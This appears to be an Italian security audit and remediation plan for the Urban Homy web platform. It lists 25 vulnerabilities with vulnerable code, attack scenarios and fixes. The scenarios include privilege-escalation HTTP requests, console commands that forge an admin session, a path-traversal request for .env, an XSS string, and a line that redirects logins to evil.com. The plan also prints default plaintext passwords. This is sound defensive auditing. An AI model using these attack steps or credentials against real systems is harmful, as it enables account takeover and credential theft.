# Urban Homy — Security Remediation Plan

**Data audit**: 2026-09-23  
**Scope**: Backend (Express + Prisma), Frontend (React × 5 app), Portal (serve.ts), Infrastruttura (Docker)  
**Totale vulnerabilità**: 25 (5 Critical · 6 High · 8 Medium · 6 Low)

---

## Come usare questo documento

Ogni issue ha:
- **ID** univoco per tracciabilità
- **Criticità** e **categoria**
- **Posizione** esatta (file:riga)
- **Codice vulnerabile**
- **Scenario di attacco**
- **Fix concreto** con esempio di codice dove applicabile
- **Effort** stimato (S = ore, M = giorni, L = settimane)

---

## CRITICAL

---

### C1 · Assenza totale di autorizzazione server-side

| Campo | Valore |
|-------|--------|
| **Categoria** | Broken Access Control (OWASP A01) |
| **File** | `backend/src/index.ts:18`, `backend/src/routes/crud.ts` |
| **Effort** | L |

**Codice vulnerabile**
```ts
// index.ts — requireAuth verifica solo la validità del JWT, non il ruolo
app.use("/api", requireAuth);
app.use("/api/utenti/accounts", makeCrudRouter(...));  // zero verifica ruolo
app.use("/api/manutenzioni", makeCrudRouter(...));     // idem
```

**Scenario di attacco**  
Qualsiasi utente con token valido (anche "reception123") chiama:
- `GET /api/utenti/accounts` → esfiltra tutti gli account
- `DELETE /api/utenti/accounts/ACC-1` → elimina l'admin
- `PUT /api/manutenzioni/MNT-1` → modifica dati di manutenzione non propri

L'intero RBAC (`hasAccesso`, `ruoloIn`, `permesso`) vive solo nel browser — è cosmesi UI, non sicurezza.

**Fix**  
Creare un middleware di autorizzazione server-side che verifichi ruolo e permessi prima di ogni route:

```ts
// backend/src/middleware/authorize.ts
import type { Request, Response, NextFunction } from "express";
import prisma from "../prisma.js";

type AppId = "manutenzioni" | "ticketIt" | "baggyLocker" | "vendingMachine";
type Permission = "lettura" | "modifica" | "creazione" | "eliminazione";

export function requireRole(appId: AppId, permission: Permission) {
  return async (req: Request, res: Response, next: NextFunction) => {
    const account = req.account; // impostato da requireAuth
    const accesso = (account.accessi as Record<string, { abilitato: boolean; ruoloId: string }>)[appId];
    
    if (!accesso?.abilitato) {
      return res.status(403).json({ error: "Accesso non autorizzato a questa applicazione" });
    }
    
    const ruolo = await prisma.utentiRuolo.findUnique({ where: { id: accesso.ruoloId } });
    const permessi = ruolo?.permessi as Record<string, Record<string, boolean>>;
    
    // Determina il modulo dalla path della request
    const modulo = req.baseUrl.split("/").pop() ?? "";
    if (!permessi?.[modulo]?.[permission]) {
      return res.status(403).json({ error: `Permesso '${permission}' non concesso su '${modulo}'` });
    }
    
    next();
  };
}

export function requireGlobalAdmin(req: Request, res: Response, next: NextFunction) {
  if (req.account.ruoloGlobale !== "Amministratore") {
    return res.status(403).json({ error: "Richiesto ruolo Amministratore globale" });
  }
  next();
}
```

```ts
// index.ts — applicazione per sezione
app.use("/api/utenti", requireAuth, requireGlobalAdmin);
app.use("/api/manutenzioni", requireAuth, requireRole("manutenzioni", "lettura"));
// ecc. per ogni app
```

---

### C2 · Mass assignment → privilege escalation

| Campo | Valore |
|-------|--------|
| **Categoria** | Mass Assignment (OWASP A03) |
| **File** | `backend/src/routes/crud.ts:103-122` |
| **Effort** | M |

**Codice vulnerabile**
```ts
// Il body intero passa a Prisma senza filtraggio
const { id: _id, ...rest } = req.body as AnyRecord;
const item = await delegate.update({ where: { id: req.params.id }, data: rest });
```

**Scenario di attacco**
```http
PUT /api/utenti/accounts/mio-id
Content-Type: application/json
Authorization: Bearer <token-utente-normale>

{"ruoloGlobale": "Amministratore", "accessi": {"manutenzioni": {"abilitato": true, "ruoloId": "RUOLO-manutenzioni-admin"}}}
```
→ Utente normale diventa admin istantaneamente.

**Fix**  
Aggiungere `allowedFields` alle opzioni del router CRUD e filtrare il body:

```ts
interface CrudOptions {
  idPrefix?: string;
  include?: AnyRecord;
  modelName?: string;
  omit?: string[];
  hashFields?: string[];
  allowedFields?: string[];        // ← nuovo
  deniedFields?: string[];         // ← nuovo (blacklist alternativa)
}

function filterFields(data: AnyRecord, opts: CrudOptions): AnyRecord {
  if (opts.allowedFields) {
    return Object.fromEntries(
      Object.entries(data).filter(([k]) => opts.allowedFields!.includes(k))
    );
  }
  if (opts.deniedFields) {
    return Object.fromEntries(
      Object.entries(data).filter(([k]) => !opts.deniedFields!.includes(k))
    );
  }
  return data;
}
```

```ts
// index.ts — proteggere i campi sensibili
app.use("/api/utenti/accounts", makeCrudRouter(prisma.utentiAccount as never, {
  idPrefix: "ACC",
  omit: ["password"],
  hashFields: ["password"],
  deniedFields: ["ruoloGlobale", "accessi"],  // ← solo admin può modificarli
}));
```

---

### C3 · Credenziali in chiaro nel bundle client

| Campo | Valore |
|-------|--------|
| **Categoria** | Credential Exposure (OWASP A02) |
| **File** | `shared/accounts.ts:189-224` |
| **Effort** | S |

**Codice vulnerabile**
```ts
const DEFAULT_ACCOUNTS: UHAccount[] = [
  { email: "admin@urbanhomy.it",           password: "admin123", ... },
  { email: "michele.antoci@urbanhomy.com", password: "urbanhomy123", ... },
  { email: "marco.b@urbanhomy.it",         password: "manutenzione123", ... },
  { email: "maria.c@urbanhomy.it",         password: "reception123", ... },
  { email: "davide.r@urbanhomy.it",        password: "amministrazione123", ... },
];
```

Visibile in `dist/bundle.js` di ogni applicazione. Apri DevTools → Sources → cerca `admin123`.

**Scenario di attacco**  
Visitatore apre il sito → DevTools → `Ctrl+F` su bundle.js → trova password → le prova su `/api/auth/login`. Se riutilizzate su altri sistemi aziendali (email, VPN, ecc.) compromissione immediata.

**Fix**
1. Rimuovere `DEFAULT_ACCOUNTS` da `shared/accounts.ts` — il seed appartiene esclusivamente a script server-side
2. Ruotare immediatamente tutte le password esposte
3. Verificare se le password sono state riutilizzate su altri sistemi
4. Il seed deve usare password generate casualmente e non documentate nel codice:

```ts
// backend/scripts/seed-other-apps.ts — NON usare password hardcoded
import crypto from "crypto";
import bcrypt from "bcryptjs";

const generatePassword = () => crypto.randomBytes(16).toString("hex");
const accounts = [
  { id: "ACC-1", nome: "Amministratore", email: "admin@urbanhomy.it",
    password: await bcrypt.hash(generatePassword(), 10), ... },
];
// Stampare le password generate una sola volta a schermo, non nel codice
```

---

### C4 · `window.UHAccounts` esposto globalmente → auth bypass da console

| Campo | Valore |
|-------|--------|
| **Categoria** | Authentication Bypass (OWASP A07) |
| **File** | `shared/accounts.js` (generato da `build-apps.sh`) |
| **Effort** | M |

**Codice vulnerabile**
```js
// shared/accounts.js — footer generato da esbuild
window.UHAccounts = _UHAccountsModule.default;
```

**Scenario di attacco**  
Da console browser (zero privilegi richiesti):
```js
// Admin istantaneo
UHAccounts.saveSession({id: "ACC-1"});
location.reload();

// Escalation ruolo
let accounts = UHAccounts.loadAccounts();
accounts[0].ruoloGlobale = "Amministratore";
UHAccounts.saveAccounts(accounts);

// Sostituzione infinita (eredita permessi admin)
UHAccounts.saveSostituti([{
  sostitutoId: "mio-id", titolareId: "ACC-1",
  appId: "manutenzioni", dataInizio: "2020-01-01", dataFine: "2099-12-31"
}]);
```

**Fix**  
La home portal ha bisogno solo di `login`, `loadSession`, `clearSession`, `hasAccesso`, `isAdminGlobale`. Esporre esclusivamente questi:

```ts
// shared/accounts.browser.ts — nuovo entry point ridotto
import UHAccountsModule from "./accounts.js";

// Espone solo l'API pubblica minimale necessaria alla home
(globalThis as Record<string, unknown>).UHAccounts = {
  login:          UHAccountsModule.login,
  loginSso:       UHAccountsModule.loginSso,
  loadSession:    UHAccountsModule.loadSession,
  clearSession:   UHAccountsModule.clearSession,
  hasAccesso:     UHAccountsModule.hasAccesso,
  isAdminGlobale: UHAccountsModule.isAdminGlobale,
  ruoloIn:        UHAccountsModule.ruoloIn,
  loadSedi:       UHAccountsModule.loadSedi,
  // NON esporre: saveAccounts, saveRoles, saveSostituti, saveSession
};
Object.freeze((globalThis as Record<string, unknown>).UHAccounts);
```

Nota: la soluzione definitiva è l'implementazione di C1 (autorizzazione server-side), che rende questa manipolazione inefficace anche se eseguita.

---

### C5 · ID controllato dal client + email non unique → account takeover

| Campo | Valore |
|-------|--------|
| **Categoria** | Business Logic / Auth (OWASP A04) |
| **File** | `backend/src/routes/crud.ts:105`, `backend/prisma/schema.prisma:205` |
| **Effort** | S |

**Codice vulnerabile**
```ts
// crud.ts — il client può fornire l'ID
const id = (req.body as AnyRecord).id ?? `${idPrefix}-${crypto.randomUUID()}`;

// schema.prisma — nessun vincolo unique sull'email
model UtentiAccount {
  email String  // ← manca @unique
```

**Scenario di attacco**
```http
POST /api/utenti/accounts
{"id": "ACC-1", "email": "admin@urbanhomy.it", "password": "miapassword", "ruoloGlobale": "Amministratore"}
```
Crea un secondo account con la stessa email dell'admin. `findFirst` nel login restituisce risultato arbitrario.

**Fix**
```ts
// crud.ts — ignorare sempre l'ID dal client, generare server-side
const id = `${idPrefix}-${crypto.randomUUID()}`;
// Rimuovere completamente: `(req.body as AnyRecord).id ??`
```

```prisma
// schema.prisma
model UtentiAccount {
  id           String  @id
  email        String  @unique   // ← aggiungere @unique
  ...
}
```

Poi: `prisma migrate dev --name add_email_unique_constraint`

---

## HIGH

---

### H1 · Path traversal in `portal/serve.ts`

| Campo | Valore |
|-------|--------|
| **Categoria** | Path Traversal (OWASP A01) |
| **File** | `portal/serve.ts:69-76` |
| **Effort** | S |

**Codice vulnerabile**
```ts
const rest = "/" + segments.slice(1).join("/");
const filePath = path.join(roots[app], rest === "/" ? "/index.html" : rest);
send(res, filePath);
// `path.join` non neutralizza i componenti ".."
```

**Scenario**: `GET /shared/../../.env` → espone credenziali.

**Fix**
```ts
function safePath(root: string, relativePath: string): string | null {
  const resolved = path.resolve(root, "." + relativePath);
  if (!resolved.startsWith(path.resolve(root))) return null;
  return resolved;
}

// Nell'handler:
const filePath = safePath(roots[app], rest === "/" ? "/index.html" : rest);
if (!filePath) { res.writeHead(403); res.end("Forbidden"); return; }
send(res, filePath);
```

---

### H2 · Script CDN senza Subresource Integrity (supply-chain XSS)

| Campo | Valore |
|-------|--------|
| **Categoria** | Supply-Chain Attack / XSS (OWASP A08) |
| **File** | Tutti i `dist/index.html`, `portal/index.html:8` |
| **Effort** | M |

**Codice vulnerabile**
```html
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/@azure/msal-browser@3/+esm"></script>
```

Se il CDN è compromesso o il DNS dirottato, JS arbitrario esegue nel contesto dell'app.

**Fix**
1. **Tailwind**: abbandonare il Play CDN (non adatto alla produzione). Integrare Tailwind nel processo di build esbuild con il plugin `@tailwindcss/vite` o come CLI:
   ```bash
   npm install tailwindcss @tailwindcss/cli
   npx @tailwindcss/cli -i src/styles.css -o dist/styles.css
   ```
2. **MSAL**: installare come dipendenza npm e bundlare:
   ```bash
   npm install @azure/msal-browser
   ```
3. Se si mantengono CDN, aggiungere `integrity` hash e CSP:
   ```html
   <script src="https://cdn.jsdelivr.net/..." integrity="sha384-HASH" crossorigin="anonymous"></script>
   ```

---

### H3 · PostgreSQL esposto sulla rete host

| Campo | Valore |
|-------|--------|
| **Categoria** | Network Exposure |
| **File** | `docker-compose.yml:9` |
| **Effort** | S |

**Codice vulnerabile**
```yaml
db:
  ports:
    - "5432:5432"  # ← espone il DB direttamente all'host
```

**Fix**
```yaml
db:
  # Rimuovere completamente il blocco ports
  # Il backend raggiunge il DB tramite la rete Docker interna
  # Se serve accesso locale per sviluppo, usare solo localhost:
  ports:
    - "127.0.0.1:5432:5432"
```

---

### H4 · Iniezione HTML non escaped in `serve.ts`

| Campo | Valore |
|-------|--------|
| **Categoria** | HTML/Script Injection |
| **File** | `portal/serve.ts:43-48` |
| **Effort** | S |

**Codice vulnerabile**
```ts
injection += `<script>window.__UH_API_BASE__="${apiBaseUrl}";</script>`;
// Se API_BASE_URL = `";alert(1);//` → XSS
```

**Fix**
```ts
// Usare JSON.stringify che gestisce correttamente escaping e quoting
injection += `<script>window.__UH_API_BASE__=${JSON.stringify(apiBaseUrl)};</script>`;
injection += `<script>window.__UH_MSAL_CLIENT_ID__=${JSON.stringify(msalClientId)};window.__UH_MSAL_TENANT_ID__=${JSON.stringify(msalTenantId ?? "")};</script>`;
```

---

### H5 · Upload foto senza validazione (DoS + content injection)

| Campo | Valore |
|-------|--------|
| **Categoria** | Unrestricted File Upload (OWASP A04) |
| **File** | `apps/manutenzioni/src/App.tsx:2872`, `apps/ticket-it/src/App.tsx:805` |
| **Effort** | S |

**Codice vulnerabile**
```ts
const files = Array.from(e.target.files || []);
// Nessun limite di dimensione, tipo MIME o conteggio
Promise.all(files.map((file) => new Promise<string>((resolve) => {
  const reader = new FileReader();
  reader.onload = () => resolve(reader.result as string);
  reader.readAsDataURL(file);
}))).then((dataUrls) => setF((prev) => ({ ...prev, foto: [...prev.foto, ...dataUrls] })));
```

**Fix**
```ts
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5 MB
const MAX_PHOTOS = 10;
const ALLOWED_TYPES = ["image/jpeg", "image/png", "image/webp", "image/gif"];

function aggiungiFoto(e: React.ChangeEvent<HTMLInputElement>) {
  const files = Array.from(e.target.files || []);
  const invalidi = files.filter(f => !ALLOWED_TYPES.includes(f.type) || f.size > MAX_FILE_SIZE);
  if (invalidi.length > 0) {
    alert(`File non validi: solo immagini (JPEG, PNG, WebP) fino a 5 MB.`);
    return;
  }
  if ((f.foto?.length ?? 0) + files.length > MAX_PHOTOS) {
    alert(`Massimo ${MAX_PHOTOS} foto per intervento.`);
    return;
  }
  // ... resto della logica
}
```

---

### H6 · Sostituzione tecnico manipolabile via localStorage

| Campo | Valore |
|-------|--------|
| **Categoria** | Privilege Escalation (OWASP A01) |
| **File** | `shared/accounts.ts:288-293` |
| **Effort** | L |

**Codice vulnerabile**
```ts
function sostituzioneAttiva(sostitutoId: string, appId: string): UHSostituto | null {
  return loadSostituti().find((s) =>  // legge da localStorage — manipolabile
    s.sostitutoId === sostitutoId && s.appId === appId && ...
  ) || null;
}
```

**Scenario**: `UHAccounts.saveSostituti([{sostitutoId:"mio-id", titolareId:"ACC-1", ...}])` → ereditare permessi admin.

**Fix**  
Le sostituzioni devono essere caricate dal backend all'avvio sessione e incluse nel JWT o in una risposta autenticata:
```ts
// backend: endpoint che restituisce la sostituzione attiva
router.get("/me/sostituzione", requireAuth, async (req, res) => {
  const oggi = new Date().toISOString().slice(0, 10);
  const sostituzione = await prisma.utentiSostituto.findFirst({
    where: {
      sostitutoId: req.account.id,
      dataInizio: { lte: oggi },
      dataFine: { gte: oggi },
    },
  });
  res.json({ sostituzione });
});
```

---

## MEDIUM

---

### M1 · Nessun rate limiting sull'endpoint di login

| Campo | Valore |
|-------|--------|
| **Categoria** | Brute Force (OWASP A07) |
| **File** | `backend/src/routes/auth.ts:19` |
| **Effort** | S |

**Fix**
```ts
// backend/src/index.ts
import rateLimit from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 60 * 1000,    // 1 minuto
  max: 5,                  // max 5 tentativi per IP
  message: { error: "Troppi tentativi. Riprova tra un minuto." },
  standardHeaders: true,
  legacyHeaders: false,
});

app.use("/api/auth/login", loginLimiter);
// npm install express-rate-limit @types/express-rate-limit
```

---

### M2 · JWT TTL di 7 giorni senza meccanismo di revoca

| Campo | Valore |
|-------|--------|
| **Categoria** | Session Management (OWASP A07) |
| **File** | `backend/src/auth.ts:9` |
| **Effort** | M |

**Fix**
```ts
// Ridurre TTL
const TOKEN_TTL = "15m";     // access token breve
const REFRESH_TTL = "7d";   // refresh token separato

// Aggiungere tokenVersion al modello per revoca immediata
// schema.prisma:
// model UtentiAccount {
//   tokenVersion Int @default(0)
// }

// auth.ts — includere tokenVersion nel payload
function signToken(accountId: string, tokenVersion: number): string {
  return jwt.sign({ sub: accountId, ver: tokenVersion }, SECRET!, { expiresIn: TOKEN_TTL });
}

// requireAuth — verificare la versione
const account = await prisma.utentiAccount.findUnique({ where: { id: payload.sub } });
if (!account || (account as any).tokenVersion !== payload.ver) {
  return res.status(401).json({ error: "Token non valido" });
}
```

---

### M3 · CORS aperto quando env var non configurata

| Campo | Valore |
|-------|--------|
| **Categoria** | CORS Misconfiguration |
| **File** | `backend/src/index.ts:12` |
| **Effort** | S |

**Codice vulnerabile**
```ts
app.use(cors(corsOrigins ? { origin: corsOrigins.split(",") } : {}));
// cors({}) → Access-Control-Allow-Origin: *
```

**Fix** (fail-closed):
```ts
const corsOrigins = process.env.CORS_ALLOWED_ORIGINS;
if (!corsOrigins && process.env.NODE_ENV === "production") {
  throw new Error("CORS_ALLOWED_ORIGINS obbligatoria in produzione");
}
app.use(cors({
  origin: corsOrigins ? corsOrigins.split(",").map(s => s.trim()) : false,
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));
```

---

### M4 · Nessuna validazione dell'input su nessun endpoint

| Campo | Valore |
|-------|--------|
| **Categoria** | Input Validation (OWASP A03) |
| **File** | `backend/src/routes/crud.ts`, `backend/src/routes/auth.ts` |
| **Effort** | L |

**Fix**
```ts
// npm install zod
import { z } from "zod";

// backend/src/schemas/auth.ts
export const LoginSchema = z.object({
  email: z.string().email().max(255),
  password: z.string().min(1).max(128),
});

// Middleware di validazione riutilizzabile
function validate<T>(schema: z.ZodSchema<T>) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({ error: "Dati non validi", details: result.error.flatten() });
    }
    req.body = result.data;
    next();
  };
}

// Applicazione
router.post("/login", validate(LoginSchema), async (req, res, next) => { ... });
```

---

### M5 · Algoritmo JWT non specificato in `verify()`

| Campo | Valore |
|-------|--------|
| **Categoria** | JWT Misconfiguration |
| **File** | `backend/src/auth.ts:23` |
| **Effort** | S |

**Fix**
```ts
// Prima
const payload = jwt.verify(token, SECRET!) as JwtPayload;

// Dopo
const payload = jwt.verify(token, SECRET!, { algorithms: ["HS256"] }) as JwtPayload;
```

---

### M6 · SSO Microsoft non verifica audience né tenant

| Campo | Valore |
|-------|--------|
| **Categoria** | Authentication (OWASP A07) |
| **File** | `backend/src/routes/auth.ts:39-66` |
| **Effort** | M |

**Fix**  
Verificare `aud` e `tid` dal token MS decodificandolo prima di chiamare Graph:

```ts
import jwt_decode from "jwt-decode";

interface MsTokenClaims { aud: string; tid: string; }

router.post("/sso", async (req, res, next) => {
  const { msAccessToken } = req.body;
  
  // Decodifica senza verificare (la verifica la fa Graph API)
  const claims = jwt_decode<MsTokenClaims>(msAccessToken);
  
  // Verifica tenant
  const expectedTenant = process.env.MSAL_TENANT_ID;
  if (expectedTenant && expectedTenant !== "organizations" && claims.tid !== expectedTenant) {
    return res.status(401).json({ error: "Tenant Microsoft non autorizzato" });
  }
  
  // ... resto della logica invariata
});
```

---

### M7 · Container backend eseguito come root

| Campo | Valore |
|-------|--------|
| **Categoria** | Container Security |
| **File** | `backend/Dockerfile` |
| **Effort** | S |

**Fix**
```dockerfile
# Dopo npm install e compilazione, prima di EXPOSE
RUN addgroup -S app && adduser -S app -G app && \
    chown -R app:app /app
USER app

EXPOSE 4000
ENTRYPOINT ["./entrypoint.sh"]
```

---

### M8 · `window.__UH_API_BASE__` sovrascrivibile dalla console

| Campo | Valore |
|-------|--------|
| **Categoria** | Configuration Tampering |
| **File** | `shared/accounts.ts:84`, `portal/serve.ts:43` |
| **Effort** | S |

**Scenario**: `window.__UH_API_BASE__ = "https://evil.com/api"` → credenziali di login inviate al server dell'attaccante.

**Fix** in `portal/serve.ts`:
```ts
// Congelare la variabile dopo averla impostata
const apiInjection = `
<script>
  Object.defineProperty(window, '__UH_API_BASE__', {
    value: ${JSON.stringify(apiBaseUrl)},
    writable: false,
    configurable: false
  });
</script>`;
```

---

## LOW

---

### L1 · Nessun security header (Helmet)

| Campo | Valore |
|-------|--------|
| **File** | `backend/src/index.ts` |
| **Effort** | S |

**Fix**
```ts
// npm install helmet @types/helmet
import helmet from "helmet";
app.use(helmet());
// Aggiunge: X-Content-Type-Options, X-Frame-Options, HSTS, ecc.
```

Per il portal (`serve.ts`), aggiungere header HTTP nelle risposte:
```ts
res.writeHead(200, {
  "Content-Type": contentType,
  "X-Content-Type-Options": "nosniff",
  "X-Frame-Options": "DENY",
  "X-XSS-Protection": "1; mode=block",
});
```

---

### L2 · Token JWT in `localStorage` (vulnerabile a XSS)

| Campo | Valore |
|-------|--------|
| **File** | `shared/accounts.ts:351` |
| **Effort** | L |

**Fix** (migrazione a cookie HttpOnly):
```ts
// backend/src/routes/auth.ts — impostare cookie invece di restituire token nel body
res.cookie("uh_token", token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "strict",
  maxAge: 15 * 60 * 1000, // 15 minuti
});
res.json({ account: omitPassword(account) });
```

```ts
// backend/src/auth.ts — leggere il token dal cookie invece dell'header
const token = req.cookies?.uh_token || 
              (req.headers.authorization?.split(" ")[1]); // fallback per API esterne
```

Richiede `npm install cookie-parser @types/cookie-parser`.

---

### L3 · Nessun logging delle richieste né audit trail

| Campo | Valore |
|-------|--------|
| **File** | `backend/src/index.ts` |
| **Effort** | S |

**Fix**
```ts
// npm install morgan @types/morgan
import morgan from "morgan";

// Log strutturato con user ID
app.use(morgan(':remote-addr - :method :url :status - :response-time ms - user=:user', {
  tokens: { user: (req: Request) => (req as any).account?.id || "anonymous" }
}));

// Per operazioni distruttive (DELETE), aggiungere audit log:
router.delete("/:id", async (req, res, next) => {
  console.log(`AUDIT DELETE ${req.params.id} by ${req.account?.id} at ${new Date().toISOString()}`);
  // ... resto
});
```

---

### L4 · `SEED_SAMPLE_DATA=true` cancella tutti i dati ad ogni restart

| Campo | Valore |
|-------|--------|
| **File** | `backend/entrypoint.sh:15`, `backend/prisma/seed.ts` |
| **Effort** | S |

**Fix**
```sh
# entrypoint.sh — guardia produzione
if [ "$SEED_SAMPLE_DATA" = "true" ]; then
  if [ "$NODE_ENV" = "production" ]; then
    echo "ERRORE: SEED_SAMPLE_DATA=true non consentito in NODE_ENV=production. Uscita."
    exit 1
  fi
  echo "Seeding dati di esempio (solo sviluppo)..."
  # ...
fi
```

```ts
// In ogni seed script
if (process.env.NODE_ENV === "production") {
  throw new Error("Seed non eseguibile in produzione");
}
```

---

### L5 · Dipendenze con range `^` senza lockfile

| Campo | Valore |
|-------|--------|
| **File** | `backend/package.json` |
| **Effort** | S |

**Fix**
```bash
# Committare il lockfile (già presente, ma spesso in .gitignore per errore)
git add package-lock.json

# Aggiungere audit in CI
npm audit --audit-level=high

# Considerare pinning per pacchetti di sicurezza critici
npm pkg set dependencies.jsonwebtoken="9.0.3"
npm pkg set dependencies.bcryptjs="3.0.3"
```

---

### L6 · Identità tecnico (`utenteCorrenteId`) in localStorage

| Campo | Valore |
|-------|--------|
| **File** | `apps/manutenzioni/src/App.tsx:456` |
| **Effort** | M |

**Codice vulnerabile**
```ts
const [utenteCorrenteId, setUtenteCorrenteId] = useState<string>(
  () => localStorage.getItem("uh_utenteCorrenteId") || ""
);
```

**Fix**  
Derivare l'identità del tecnico dall'account autenticato. Il `manutentoreId` associato all'utente deve essere restituito dal backend al momento del login:

```ts
// backend: aggiungere campo opzionale alla risposta /auth/login
const manutentore = await prisma.manutentore.findFirst({
  where: { email: account.email }
});
res.json({ token, account: omitPassword(account), manutentoreId: manutentore?.id ?? null });
```

```ts
// frontend: usare il manutentoreId dalla sessione, non da localStorage
const [sessione] = useState(() => UHAccounts.loadSession());
const manutentoreId = sessione?.manutentoreId ?? "";
```

---

## Roadmap di remediation

### Fase 1 — Immediato (prima di qualsiasi accesso esterno)
| ID | Issue | Effort |
|----|-------|--------|
| C3 | Rimuovere credenziali dal bundle + rotazione password | S |
| C4 | Limitare `window.UHAccounts` ai soli metodi pubblici | M |
| H3 | Rimuovere mapping porta DB da docker-compose | S |
| H1 | Aggiungere containment check path traversal in serve.ts | S |
| H4 | JSON.stringify per env vars in HTML injection | S |
| M5 | `algorithms: ['HS256']` in jwt.verify | S |
| C5 | `@unique` su email + ID sempre generato server-side | S |

### Fase 2 — Breve termine (entro 1 settimana)
| ID | Issue | Effort |
|----|-------|--------|
| C1 | Autorizzazione server-side (RBAC middleware) | L |
| C2 | Field allowlisting su tutti gli endpoint CRUD | M |
| M1 | Rate limiting su /api/auth/login | S |
| M3 | CORS fail-closed | S |
| M7 | Container non-root | S |
| L1 | Helmet (security headers backend) | S |
| L4 | Guardia NODE_ENV nei seed script | S |

### Fase 3 — Medio termine (entro 1 mese)
| ID | Issue | Effort |
|----|-------|--------|
| M2 | JWT TTL breve + refresh token | M |
| M4 | Validazione input con zod su tutti gli endpoint | L |
| H2 | Self-hosting librerie CDN (Tailwind, MSAL) | M |
| M6 | Verifica audience/tenant SSO Microsoft | M |
| H5 | Validazione file upload (tipo, dimensione, conteggio) | S |
| H6 | Sostituzione tecnico validata server-side | L |
| M8 | Congelare `__UH_API_BASE__` con Object.defineProperty | S |

### Fase 4 — Lungo termine (hardening continuo)
| ID | Issue | Effort |
|----|-------|--------|
| L2 | Migrazione token da localStorage a HttpOnly cookie | L |
| L3 | Logging strutturato e audit trail | S |
| L5 | Dipendenze pinnate + npm audit in CI | S |
| L6 | Identità tecnico derivata da sessione server-side | M |

---

## Note architetturali

Il punto di partenza per risolvere la maggior parte delle vulnerabilità critiche è una singola decisione progettuale:

> **Spostare l'autorizzazione dal browser al server.**

Attualmente il browser decide cosa mostrare in base ai permessi in localStorage. Il server accetta qualsiasi richiesta autenticata. Questa è un'inversione del modello di sicurezza corretto.

La sequenza corretta:
1. Il **server** è l'unica fonte di verità per autorizzazione e dati
2. Il **browser** riceve solo i dati a cui l'utente ha diritto
3. Il **token JWT** trasporta l'identità, non i permessi (che vengono verificati server-side ad ogni request)
4. Il **localStorage** può al massimo cachare UI state non sensibile

Una volta implementato C1, le vulnerabilità C2, C4, H4, H6, M4, M8, L6 diventano significativamente meno critiche poiché il backend non si fida mai del client per decisioni di autorizzazione.

---

*Documento generato da analisi statica del codice. Aggiornare questo file a ogni fix applicato.*
